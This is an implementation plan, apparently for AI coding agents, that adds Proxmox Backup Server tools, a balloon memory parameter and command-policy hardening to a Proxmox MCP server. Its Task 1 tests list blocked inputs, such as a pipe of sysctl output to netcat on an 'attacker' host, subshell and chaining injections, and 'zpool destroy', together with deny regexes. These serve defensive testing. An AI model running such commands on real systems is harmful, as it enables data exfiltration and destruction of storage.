# PBS Support (8007), `balloon` in `update_vm_config` & `command_policy` Hardening — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use `subagent-driven-development` (recommended) or `executing-plans` to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Aggiungere il supporto nativo a Proxmox Backup Server (PBS, porta 8007) con tool read-only e manutenzioni sicure, esporre `balloon` in `update_vm_config` e ampliare in modo controllato `command_policy.allow_patterns` con hardening anti-injection.

**Architecture:** Riusa `TargetRegistry` e `ProxmoxManager` (`proxmoxer` con `service="PBS"`, porta default `8007` e `token_separator=":"`), introducendo `PBSTools` isolato dai tool PVE tramite filtro `expected_service` in `TargetRegistry.resolve` e `RegistryPluginBase`. Estende `VMTools.update_vm_config` con validazione `0 <= balloon <= memory` e rafforza `CommandPolicyGate.evaluate` bloccando metacaratteri shell prima del matching su allowlist granulare.

**Tech Stack:** Python 3.12+, Pydantic v2, `proxmoxer>=2.0.1`, FastMCP / `mcp>=1.30.0`, `pytest` (`.venv/bin/pytest`).

**Spec:** [`docs/superpowers/specs/2026-11-15-pbs-balloon-policy-design.md`](file:///home/federico/ProxmoxMCP-Plus/docs/superpowers/specs/2026-11-15-pbs-balloon-policy-design.md)

## Global Constraints

- **Sicurezza:** mai token o password in chiaro; tutela assoluta VMID 110 (ROM); nessuna esposizione di azioni distruttive PBS (`delete_datastore`, `forget`, `prune`, `gc`, `wipe_disk`, `zpool destroy`).
- **Crash Antibody `AB-PVE-002`:** mai consentire `apt-get upgrade` su nodi Proxmox; per gli aggiornamenti di sistema sono ammessi solo `dist-upgrade` / `full-upgrade`.
- **Docker Runtime (`romm`):** nessuna modifica obbligatoria a `/opt/stacks/proxmox-mcp/compose.yaml`; compatibilità piena con `config-cluster.json`.
- **Test Falsification:** ogni test deve fallire se la logica di produzione o la validazione è rotta (vietati mock tautologici della funzione sotto test).
- **Virtualenv:** eseguire sempre i test con `.venv/bin/pytest` (mai `/usr/bin/python3`).

---

## Blast Radius & StateGraph (`onSuccess` / `onFailure`)

### `BlastRadius`
- `direct_files`:
  - `src/proxmox_mcp/config/models.py`
  - `src/proxmox_mcp/config/loader.py`
  - `src/proxmox_mcp/security/command_policy.py`
  - `src/proxmox_mcp/core/targets.py`
  - `src/proxmox_mcp/core/proxmox.py`
  - `src/proxmox_mcp/tools/vm.py`
  - `src/proxmox_mcp/tools/pbs.py` (nuovo)
  - `src/proxmox_mcp/tools/definitions.py`
  - `src/proxmox_mcp/services/tool_catalog.py`
  - `src/proxmox_mcp/services/tool_wrappers.py`
  - `src/proxmox_mcp/services/builtin_tool_plugins.py`
  - `src/proxmox_mcp/server.py`
  - `tests/test_command_policy.py`, `tests/test_guest_configuration.py`, `tests/test_pbs_tools.py` (nuovo), `tests/test_targets.py`
- `transitively_affected`:
  - `src/proxmox_mcp/openapi_proxy.py` (importa `BUILTIN_TOOL_NAMES` da `tool_catalog.py` e usa `ToolExposurePolicy`)
  - `src/proxmox_mcp/services/tool_registry.py` (valida i tool registrati rispetto a `BUILTIN_TOOL_NAMES`)
  - `tests/test_tool_filtering.py` / `tests/test_release_metadata.py` (se verificano il numero/elenco di `BUILTIN_TOOL_NAMES`)
- `uncertain`:
  - Endpoint esatto HTTP per ZFS scrub su PBS (`/nodes/localhost/disks/zfs/{name}/scrub`: `PUT` vs `POST` su `proxmoxer`) — gestito con fallback/verifica esplicita e test unitario sul contratto `proxmoxer`.
  - Comportamento `list_targets` quando un target ha `service="PBS"` (se `/nodes` risponde `[{"node": "localhost"}]` o se serve fallback su `/version` / `/admin/datastore`).

### `StateGraph` (`onSuccess` / `onFailure`)
- **Chiamate API PBS mutanti (`pbs_verify_datastore`, `pbs_scrub_zfs`)**:
  - Pre-check: `TargetRegistry.resolve(target, expected_service="PBS")` -> `readonly` check -> `CommandPolicyGate.evaluate_operation`.
  - `onSuccess`: restituisce JSON con `upid`, `target`, `status="started"`.
  - `onFailure`: cattura eccezione `proxmoxer`, registra metrica `success=False`, propaga errore sanitizzato via `_err(...)` senza mutare stato locale né esporre segreti.
- **Chiamata `update_vm_config` con `balloon`**:
  - Pre-check: validazione locale `balloon >= 0` e `balloon <= memory` prima di qualsiasi chiamata `PUT /nodes/{node}/qemu/{vmid}/config`.
  - `onSuccess`: restituisce payload applicato e nota *pending restart* se `memory` o `balloon` sono presenti.
  - `onFailure`: solleva `ValueError` su input invalido prima della rete, o `_err("update_vm_config", e)` su errore PVE.
- **Valutazione `CommandPolicyGate.evaluate`**:
  - Pre-check: comando non vuoto -> blocco metacaratteri shell (`;`, `&&`, `||`, `|`, `` ` ``, `$(`, `>`, `<`, `\n`, `\r`) -> `deny_patterns` -> `allow_patterns` -> `approval_token`.
  - `onSuccess`: `CommandPolicyDecision(True, ...)`.
  - `onFailure`: `CommandPolicyDecision(False, code, message)` con fail-closed garantito.

---

### Domain Skills & Sub-Agent Roster

| Dominio Coeso | Worker / Modello | Skill & Companion (`lookup.py`) | File Assegnati (Contratto End-to-End) |
| :--- | :--- | :--- | :--- |
| **1. Security & Command Policy** | `policy_worker` (`Model: 'pro'`) | `security-audit`, `python-development`, `ponytail`, `antislop-code` | `src/proxmox_mcp/config/models.py`, `src/proxmox_mcp/config/loader.py`, `src/proxmox_mcp/security/command_policy.py`, `tests/test_command_policy.py` |
| **2. VM `balloon` Config** | `vm_config_worker` (`Model: 'flash'`) | `python-development`, `proxmox-management`, `ponytail`, `antislop-code` | `src/proxmox_mcp/tools/vm.py`, `src/proxmox_mcp/tools/definitions.py` (sezione VM), `src/proxmox_mcp/services/builtin_tool_plugins.py` (sezione `update_vm_config`), `tests/test_guest_configuration.py` |
| **3. PBS Target, API & Tools** | `pbs_worker` (`Model: 'pro'`) | `proxmox-management`, `python-development`, `ponytail`, `antislop-code` | `src/proxmox_mcp/config/models.py` (dopo Task 1), `src/proxmox_mcp/core/targets.py`, `src/proxmox_mcp/core/proxmox.py`, `src/proxmox_mcp/tools/pbs.py`, `src/proxmox_mcp/tools/definitions.py` (sezione PBS), `src/proxmox_mcp/services/tool_catalog.py`, `src/proxmox_mcp/services/tool_wrappers.py`, `src/proxmox_mcp/services/builtin_tool_plugins.py` (sezione PBS + `list_targets`), `src/proxmox_mcp/server.py`, `tests/test_pbs_tools.py`, `tests/test_targets.py` |

> **Nota sequenzialità file condivisi:** Task 1 (`policy_worker`) precede Task 3 (`pbs_worker`) su `config/models.py`, e Task 2 (`vm_config_worker`) precede Task 4 (`pbs_worker`) su `tools/definitions.py` e `services/builtin_tool_plugins.py`, così nessun file viene mai modificato in parallelo da due worker.

---

## Audit Matrix (Dual-Gate Audit)

| Gate | Modello | Conversation ID | Esito | Note |
| :--- | :--- | :--- | :--- | :--- |
| **Stage 1** (Domain & Archaeology Pre-Audit) | `flash` | `26c92895-20af-45dd-b034-ff7580c83503` | `FAIL -> Fixed` | Risolti: `AB-PVE-002` in spec, `models.py` in roster `pbs_worker`, test `balloon=0`, e `SimpleNamespace`/`pbs_tools` in `server.py` |
| **Stage 2** (Six-Pillars Sentinel Control Gate) | `inherit` | `2a6c2a50-5075-47ac-9358-478fa742b6d8` | `PASS` | Tutti i 6 pilastri superati (Intent, Falsification, Contracts, BlastRadius/StateGraph, Security/VM110, `AB-PVE-002`/`005`) |

---

## Tasks

### Task 1: Hardening `CommandPolicyGate` e ampliamento controllato `allow_patterns`

**Files:**
- Modify: `src/proxmox_mcp/config/models.py:131-176`
- Modify: `src/proxmox_mcp/config/loader.py:164-175`
- Modify: `src/proxmox_mcp/security/command_policy.py:30-101`
- Test: `tests/test_command_policy.py`

**Interfaces:**
- Produces: `CommandPolicyConfig` con default `allow_patterns`, `deny_patterns`, `high_risk_operations` aggiornati; `CommandPolicyGate.evaluate(...)` con codice `CMD_POLICY_SHELL_METACHAR` (o `CMD_POLICY_DENY_PATTERN`) su metacaratteri shell.

- [ ] **Step 1: Write failing tests in `tests/test_command_policy.py`**

```python
def test_command_policy_allows_new_safe_diagnostic_and_maintenance_commands():
    gate = CommandPolicyGate(CommandPolicyConfig(mode="allowlist"))
    allowed = [
        "zpool status",
        "zpool status rpool",
        "zpool list",
        "zpool iostat -v",
        "zpool scrub rpool",
        "smartctl -a /dev/nvme0n1",
        "smartctl -H /dev/sda",
        "smartctl --scan",
        "zramctl",
        "zramctl --output NAME,DISKSIZE,DATA,COMPR",
        "sysctl -a",
        "sysctl vm.swappiness",
        "apt update",
        "apt list --upgradable",
        "apt-get update",
        "apt-get dist-upgrade -y",
        "apt-cache policy proxmox-ve",
    ]
    for cmd in allowed:
        decision = gate.evaluate(cmd)
        assert decision.allowed, f"Expected allowed: {cmd} ({decision.message})"


def test_command_policy_blocks_destructive_subcommands_and_shell_chaining():
    gate = CommandPolicyGate(CommandPolicyConfig(mode="allowlist"))
    blocked = [
        "zpool destroy rpool",
        "zpool export rpool",
        "zpool scrub -s rpool",
        "apt remove nginx",
        "apt-get purge curl",
        "apt-get upgrade -y",  # AB-PVE-002: mai apt-get upgrade su Proxmox
        "sysctl -w vm.swappiness=10",
        "sysctl --system",
        "zramctl --reset /dev/zram0",
        "zpool status; id",
        "zpool status && reboot",
        "sysctl -a | nc attacker 1234",
        "smartctl -a $(whoami)",
        "apt update `id`",
        "df -h > /tmp/out",
    ]
    for cmd in blocked:
        decision = gate.evaluate(cmd)
        assert not decision.allowed, f"Expected blocked: {cmd}"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_command_policy.py -q --tb=short`
Expected: FAIL on new allowed commands (`not allowlisted`) and shell chaining (`zpool status; id` / `apt-get upgrade`).

- [ ] **Step 3: Implement minimal changes in `models.py`, `loader.py`, `command_policy.py`**

1. In `src/proxmox_mcp/security/command_policy.py`, aggiungere un check deterministico su metacaratteri/chaining shell prima di `deny_patterns`/`allow_patterns` in `evaluate()`:
   ```python
   _SHELL_CHAIN_RE = re.compile(r"(;|&&|\|\||\||`|\$\(|>|<|\r|\n)")
   ```
   Se `_SHELL_CHAIN_RE.search(command)` matcha, restituire `CommandPolicyDecision(False, "CMD_POLICY_SHELL_METACHAR", "Shell chaining, subshells, and redirections are blocked by policy")`.
2. In `src/proxmox_mcp/config/models.py`:
   - Estendere `allow_patterns` con:
     - `r"^zpool\s+(status|list|iostat|get)(\s|$)"`
     - `r"^zpool\s+scrub\s+[A-Za-z0-9_.-]+$"`
     - `r"^smartctl\s+(-[aHiIl]|--scan|--info|--health|--all|--json|-j)(\s|$)"`
     - `r"^zramctl(\s+(--output|--bytes|--raw|--noheadings|--json|-[onbrj])([=\s][A-Za-z0-9_,.:/-]+)?)*$"`
     - `r"^sysctl(\s+(-[anN]|--all|--names|--values))*(\s+[A-Za-z0-9_./-]+)*$"`
     - `r"^apt(-get)?\s+(update|list|show|policy|dist-upgrade|full-upgrade|check)(\s|$)"` (no `upgrade` semplice per `AB-PVE-002`)
     - `r"^apt-cache\s+(policy|show|search|madison|depends|rdepends)(\s|$)"`
   - Estendere `deny_patterns` con:
     - `r"(^|\s)apt(-get)?\s+(remove|purge|autoremove|dpkg|upgrade)(\s|$)"`
     - `r"(^|\s)zpool\s+(destroy|create|export|offline|detach|remove|labelclear|reguid|split)(\s|$)"`
     - `r"(^|\s)zpool\s+scrub\s+-s(\s|$)"`
     - `r"(^|\s)sysctl\s+(-w|--write|--system|-p)(\s|=|$)"`
     - `r"(^|\s)zramctl\s+.*(--reset|--size|-r|-s)(\s|=|$)"`
   - Aggiungere `"pbs_verify_datastore"` e `"pbs_scrub_zfs"` a `high_risk_operations`.
3. In `src/proxmox_mcp/config/loader.py:166`:
   - Passare `allow_patterns` nel dict solo se `_parse_csv_env("COMMAND_POLICY_ALLOW_PATTERNS") is not None`, preservando i default di `CommandPolicyConfig`.

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_command_policy.py -q --tb=short`
Expected: PASS (all existing + new tests green).

- [ ] **Step 5: Commit**

```bash
git add src/proxmox_mcp/config/models.py src/proxmox_mcp/config/loader.py src/proxmox_mcp/security/command_policy.py tests/test_command_policy.py
git commit -m "feat(security): harden CommandPolicyGate and expand safe diagnostic allow_patterns"
```

---

### Task 2: Esporre parametro `balloon` in `update_vm_config`

**Files:**
- Modify: `src/proxmox_mcp/tools/vm.py:189-295`
- Modify: `src/proxmox_mcp/tools/definitions.py:153-184`
- Modify: `src/proxmox_mcp/services/builtin_tool_plugins.py:452-490`
- Test: `tests/test_guest_configuration.py`

**Interfaces:**
- Produces: `VMTools.update_vm_config(..., balloon: Optional[int] = None)` e wrapper MCP `update_vm_config(..., balloon: Annotated[Optional[int], Field(default=None, ge=0)] = None)`.

- [ ] **Step 1: Write failing tests in `tests/test_guest_configuration.py`**

```python
def test_update_vm_config_accepts_balloon_and_memory_together():
    proxmox = MagicMock()
    tools = VMTools(proxmox)
    result = tools.update_vm_config("pve1", "105", memory=4096, balloon=2048)
    proxmox.nodes("pve1").qemu("105").config.put.assert_called_once_with(
        memory=4096, balloon=2048
    )
    payload = json.loads(result[0].text)
    assert payload["applied"] == {"memory": 4096, "balloon": 2048}


def test_update_vm_config_accepts_balloon_zero_to_disable_ballooning():
    proxmox = MagicMock()
    tools = VMTools(proxmox)
    result = tools.update_vm_config("pve1", "105", balloon=0)
    proxmox.nodes("pve1").qemu("105").config.put.assert_called_once_with(balloon=0)
    payload = json.loads(result[0].text)
    assert payload["applied"] == {"balloon": 0}
    assert "sizing changes on a running VM stay pending until it is restarted" in payload["notes"]


def test_update_vm_config_rejects_negative_balloon_or_balloon_above_memory():
    proxmox = MagicMock()
    tools = VMTools(proxmox)
    with pytest.raises(ValueError, match="balloon must be >= 0"):
        tools.update_vm_config("pve1", "105", balloon=-1)
    with pytest.raises(ValueError, match="balloon cannot exceed memory"):
        tools.update_vm_config("pve1", "105", memory=2048, balloon=4096)
    proxmox.nodes.assert_not_called()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_guest_configuration.py -k balloon -q --tb=short`
Expected: FAIL (`TypeError: unexpected keyword argument 'balloon'`).

- [ ] **Step 3: Implement `balloon` in `vm.py`, `definitions.py`, `builtin_tool_plugins.py`**

1. In `src/proxmox_mcp/tools/vm.py:189-295`:
   - Aggiungere `balloon: Optional[int] = None` nella firma di `update_vm_config`.
   - Validazione:
     ```python
     if balloon is not None:
         if balloon < 0:
             raise ValueError("balloon must be >= 0 (0 disables ballooning)")
         if memory is not None and balloon > memory:
             raise ValueError("balloon cannot exceed memory")
         payload["balloon"] = int(balloon)
     ```
   - Aggiornare line 293: `if {"memory", "balloon", "cores", "sockets"} & payload.keys():`.
2. In `src/proxmox_mcp/tools/definitions.py`: documentare `balloon` in `UPDATE_VM_CONFIG_DESC`.
3. In `src/proxmox_mcp/services/builtin_tool_plugins.py:452-490`: aggiungere `balloon: Annotated[Optional[int], Field(description="Minimum/target balloon RAM in MiB (0 disables ballooning, must be <= memory)", default=None, ge=0)] = None` e passarlo a `update_vm_config(...)`.

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_guest_configuration.py -q --tb=short`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/proxmox_mcp/tools/vm.py src/proxmox_mcp/tools/definitions.py src/proxmox_mcp/services/builtin_tool_plugins.py tests/test_guest_configuration.py
git commit -m "feat(vm): expose balloon parameter in update_vm_config with memory validation"
```

---

### Task 3: Target `PBS` (porta 8007) e isolamento PVE ↔ PBS in `models`, `targets`, `proxmox`

**Files:**
- Modify: `src/proxmox_mcp/config/models.py:40-96`
- Modify: `src/proxmox_mcp/core/targets.py:25-110`
- Modify: `src/proxmox_mcp/core/proxmox.py:87-160`
- Test: `tests/test_targets.py`

**Interfaces:**
- Produces: `TargetConfig.kind: Literal["cluster", "standalone", "pbs"]`, `TargetConfig.service: Literal["PVE", "PBS"]`, default `port=8007` per `service="PBS"`, `TargetRegistry.resolve(requested, expected_service: str | None = None)`.

- [ ] **Step 1: Write failing tests in `tests/test_targets.py`**

```python
def test_pbs_target_defaults_port_8007_and_resolves_by_service():
    cfg = Config(
        targets={
            "pve": TargetConfig(
                host="10.0.0.10",
                auth=AuthConfig(user="root@pam", token_name="mcp", token_value="sec1"),
            ),
            "pbs": TargetConfig(
                host="10.0.0.20",
                service="PBS",
                kind="pbs",
                auth=AuthConfig(user="mcp@pbs", token_name="pbs-tok", token_value="sec2"),
            ),
        }
    )
    registry = TargetRegistry(cfg)
    pbs = registry.resolve(None, expected_service="PBS")
    assert pbs.name == "pbs"
    assert pbs.config.port == 8007
    assert pbs.config.service == "PBS"
    with pytest.raises(ValueError, match="not PVE"):
        registry.resolve("pbs", expected_service="PVE")
    with pytest.raises(ValueError, match="not PBS"):
        registry.resolve("pve", expected_service="PBS")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_targets.py -k pbs_target -q --tb=short`
Expected: FAIL (`ValidationError` on `kind="pbs"` / `TypeError` on `expected_service`).

- [ ] **Step 3: Implement `PBS` target config & `TargetRegistry.resolve(..., expected_service=...)`**

1. In `src/proxmox_mcp/config/models.py`:
   - `ProxmoxConfig` e `TargetConfig`: normalizzare `service` (`"PVE"` | `"PBS"`), default `port = 8007` tramite `model_validator(mode="after")` quando `service == "PBS"` e `port` non è stato esplicitamente fornito (`"port" not in self.model_fields_set`).
   - `TargetConfig.kind: Literal["cluster", "standalone", "pbs"] = "standalone"`.
2. In `src/proxmox_mcp/core/targets.py`:
   - Aggiornare `TargetRegistry.resolve(self, requested: str | None = None, *, expected_service: str | None = None) -> ResolvedTarget`:
     - Se `requested is not None`: risolve e se `expected_service` è passato verifica `target.config.service.upper() == expected_service.upper()`, altrimenti `raise ValueError(f"Target '{target.name}' is configured as {target.config.service}, not {expected_service}")`.
     - Se `requested is None`: filtra `self._targets` per `expected_service` (se valorizzato) e auto-risolve se c'è 1 solo match.
3. In `src/proxmox_mcp/core/proxmox.py`: verificare che `ProxmoxAPI(..., service=self.config.service)` passi `service="PBS"` (supportato nativamente da `proxmoxer`).

- [ ] **Step 4: Run test to verify it passes**

Run: `.venv/bin/pytest tests/test_targets.py -q --tb=short`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/proxmox_mcp/config/models.py src/proxmox_mcp/core/targets.py src/proxmox_mcp/core/proxmox.py tests/test_targets.py
git commit -m "feat(targets): add PBS service/kind support with port 8007 default and service isolation"
```

---

### Task 4: Implementazione `PBSTools` + registrazione MCP e test end-to-end su contratto `proxmoxer`

**Files:**
- Create: `src/proxmox_mcp/tools/pbs.py`
- Modify: `src/proxmox_mcp/tools/definitions.py`
- Modify: `src/proxmox_mcp/services/tool_catalog.py`
- Modify: `src/proxmox_mcp/services/tool_wrappers.py`
- Modify: `src/proxmox_mcp/services/builtin_tool_plugins.py`
- Modify: `src/proxmox_mcp/server.py`
- Create: `tests/test_pbs_tools.py`

**Interfaces:**
- Consumes: `TargetRegistry.resolve(..., expected_service="PBS")` da Task 3.
- Produces: `PBSTools` (`get_datastores`, `get_tasks`, `get_task_log`, `get_disks`, `get_zfs`, `verify_datastore`, `scrub_zfs`), `PBSToolsPlugin`, 7 tool MCP (`pbs_get_datastores`, `pbs_get_tasks`, `pbs_get_task_log`, `pbs_get_disks`, `pbs_get_zfs`, `pbs_verify_datastore`, `pbs_scrub_zfs`) in `BUILTIN_TOOL_NAMES`.

- [ ] **Step 1: Write failing tests in `tests/test_pbs_tools.py`**

Testare con mock di `ProxmoxAPI` (che verifica i path REST chiamati su `proxmoxer`, NON mockando `PBSTools`):
1. `pbs_get_datastores`: chiama `proxmox.admin.datastore.get()` e `proxmox.admin.datastore(store).status.get()`, restituisce JSON con `name`, `total`, `used`, `avail`.
2. `pbs_get_tasks` e `pbs_get_task_log`: chiama `proxmox.nodes("localhost").tasks.get(...)` e `proxmox.nodes("localhost").tasks(upid).log.get(...)`.
3. `pbs_get_disks` e `pbs_get_zfs`: chiama `proxmox.nodes("localhost").disks.list.get()` e `proxmox.nodes("localhost").disks.zfs.get()`.
4. `pbs_verify_datastore`: chiama `proxmox.admin.datastore(store).verify.post(...)` e restituisce `upid`.
5. `pbs_scrub_zfs`: chiama `proxmox.nodes("localhost").disks.zfs(pool).scrub.put()` (con fallback `post` se `put` non supportato) e restituisce `upid`.
6. `readonly=True` su target PBS: consente `pbs_get_datastores` e blocca `pbs_verify_datastore` / `pbs_scrub_zfs` prima di chiamare l'API.
7. Verifica che nessun tool distruttivo (`delete_datastore`, `forget`, `prune`, `gc`) sia registrato in `BUILTIN_TOOL_NAMES`.

- [ ] **Step 2: Run test to verify it fails**

Run: `.venv/bin/pytest tests/test_pbs_tools.py -q --tb=short`
Expected: FAIL (`ModuleNotFoundError: No module named 'proxmox_mcp.tools.pbs'`).

- [ ] **Step 3: Implement `PBSTools`, `PBSToolsPlugin`, `tool_catalog.py`, `tool_wrappers.py`, `server.py`**

1. Creare `src/proxmox_mcp/tools/pbs.py` estendendo `ProxmoxTool` con i 7 metodi (`get_datastores`, `get_tasks`, `get_task_log`, `get_disks`, `get_zfs`, `verify_datastore`, `scrub_zfs`).
2. Aggiornare `src/proxmox_mcp/tools/definitions.py` con le costanti `PBS_*_DESC`.
3. Aggiornare `src/proxmox_mcp/services/tool_catalog.py` aggiungendo i 7 nomi `pbs_*` a `BUILTIN_TOOL_NAMES`.
4. Aggiornare `src/proxmox_mcp/services/tool_wrappers.py`:
   - Aggiungere i 5 tool read-only (`pbs_get_datastores`, `pbs_get_tasks`, `pbs_get_task_log`, `pbs_get_disks`, `pbs_get_zfs`) a `_READ_ONLY_TOOLS`.
   - Aggiungere parametro `expected_service: str | None = "PVE"` a `_wrap_sync` / `_wrap_async`, passando `expected_service` a `server.target_registry.resolve(target, expected_service=expected_service)`. (Per `JobsToolsPlugin` e `list_targets` usare `expected_service=None`).
5. Aggiornare `src/proxmox_mcp/services/builtin_tool_plugins.py`:
   - Aggiungere `PBSToolsPlugin` con i 7 tool `pbs_*` (`expected_service="PBS"`, `high_risk=True` per `pbs_verify_datastore` e `pbs_scrub_zfs`).
   - In `CoreToolsPlugin.list_targets`, gestire `discover` per target `PBS` (usando `probe.proxmox.admin.datastore.get()` se `target.config.service == "PBS"`).
6. Aggiornare `src/proxmox_mcp/server.py`:
   - Istanziare `pbs_tools=PBSTools(api, metrics=self.metrics, job_store=job_store)` nel `SimpleNamespace` di `self.target_toolsets[name]` (e `self.pbs_tools = ts.pbs_tools` in legacy mode `L196-L206` se applicabile).
   - Registrare `self.tool_registry.add(PBSToolsPlugin())` in `_setup_tools()`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `.venv/bin/pytest tests/test_pbs_tools.py tests/test_targets.py tests/test_tool_filtering.py -q --tb=short`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/proxmox_mcp/tools/pbs.py src/proxmox_mcp/tools/definitions.py src/proxmox_mcp/services/tool_catalog.py src/proxmox_mcp/services/tool_wrappers.py src/proxmox_mcp/services/builtin_tool_plugins.py src/proxmox_mcp/server.py tests/test_pbs_tools.py
git commit -m "feat(pbs): add PBSTools, PBSToolsPlugin, and PVE/PBS service isolation"
```
